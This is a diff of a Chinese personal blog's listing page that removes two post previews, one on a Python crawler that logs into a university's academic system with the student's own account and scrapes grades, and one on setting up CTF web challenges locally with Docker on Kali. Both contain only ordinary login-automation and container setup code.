-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-09-16 23:50:06 / 修改时间：23:53:18" itemprop="dateCreated datePublished" datetime="2021-09-16T23:50:06+08:00">2021-09-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/python%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index"><span itemprop="name">python实践</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/6f73e94e/" class="post-meta-item leancloud_visitors" data-flag-title="中国矿业大学正方教务爬虫" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/6f73e94e/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/6f73e94e/" class="cy_cmt_count" data-xid="posts/6f73e94e/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.5k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
-<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
-<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
-<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
-<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
-<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
-<p>config如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
-<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
-<p>可以看到成功获得了cookie</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
-<p>ocr识别的话，如下</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
-<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
-<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
-<p>一些设置如下，需要保存在config.yml中</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/c52439ad/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Haorical">
-      <meta itemprop="description" content="ctf退役种子选手">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="中国熊猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/posts/c52439ad/" class="post-title-link" itemprop="url">vm+kali+docker实现web题复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-09-08 16:32:16 / 修改时间：17:19:17" itemprop="dateCreated datePublished" datetime="2021-09-08T16:32:16+08:00">2021-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">开发工具</span></a>
-        </span>
-    </span>
-
-  
-    <span id="/posts/c52439ad/" class="post-meta-item leancloud_visitors" data-flag-title="vm+kali+docker实现web题复现" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Changyan：</span>
-    
-    
-      <a title="changyan" href="/posts/c52439ad/#SOHUCS" itemprop="discussionUrl">
-        <span id="url::http://haorical.xyz/posts/c52439ad/" class="cy_cmt_count" data-xid="posts/c52439ad/" itemprop="commentCount"></span>
-      </a>
-    
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>991</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
-<li>vm</li>
-<li>kali</li>
-</ol>
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br><span class="line"></span><br><span class="line">apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common</span><br><span class="line"></span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
-<p>docker version可查看是否安装成功</p>
-<h3 id="下载lamp镜像"><a href="#下载lamp镜像" class="headerlink" title="下载lamp镜像"></a>下载lamp镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp 查找镜像</span><br><span class="line"></span><br><span class="line">docker pull mattrayner&#x2F;lamp 下载镜像</span><br><span class="line"></span><br><span class="line">docker images 查看镜像是否安装成功</span><br></pre></td></tr></table></figure>
-
-<h3 id="搭建题目"><a href="#搭建题目" class="headerlink" title="搭建题目"></a>搭建题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 100:80 -p 3307:3306 mattrayner&#x2F;lamp 创建lamp容器，并将docker 80和3306端口分别映射到虚拟机的100和3307端口</span><br><span class="line"></span><br><span class="line">docker ps -a 主要为了获得CONTAINER ID，查看当前运行的容器</span><br><span class="line"></span><br><span class="line">docker cp [题目目录] [CONTAINER ID]:&#x2F;var&#x2F;www&#x2F;html 将题目放到html文件夹</span><br><span class="line"></span><br><span class="line">docker stop [CONTAINER ID] 停止容器</span><br><span class="line"></span><br><span class="line">docker rm [CONTAINER ID] 删除容器</span><br></pre></td></tr></table></figure>
-
-<h3 id="运行题目"><a href="#运行题目" class="headerlink" title="运行题目"></a>运行题目</h3><p>ifconfig获得kali ip，本机测试是否能ping通，在浏览器输入</p>
-<pre><code>http://[kali ip]:[映射端口]/[题目目录名]/
-e.g. http://192.168.xxx.xxx:100/ezyii/
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
@@ -1643,13 +1647,13 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">133k</span>
+    <span title="站点总字数">134k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:42</span>
+    <span title="站点阅读时长">3:43</span>
   </span>
 </div>
 <div class="busuanzi-count">
